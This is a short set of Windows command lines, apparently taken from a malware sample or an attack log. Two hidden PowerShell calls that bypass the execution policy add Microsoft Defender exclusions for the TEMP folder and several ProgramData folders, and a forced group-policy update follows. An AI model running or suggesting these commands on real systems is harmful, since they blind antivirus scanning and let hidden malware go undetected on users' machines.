powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $env:TEMP"
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData','C:\ProgramData\Windows\Microsoft','C:\ProgramData\Microsoft\Windows'"
cmd.exe /C gpupdate /force
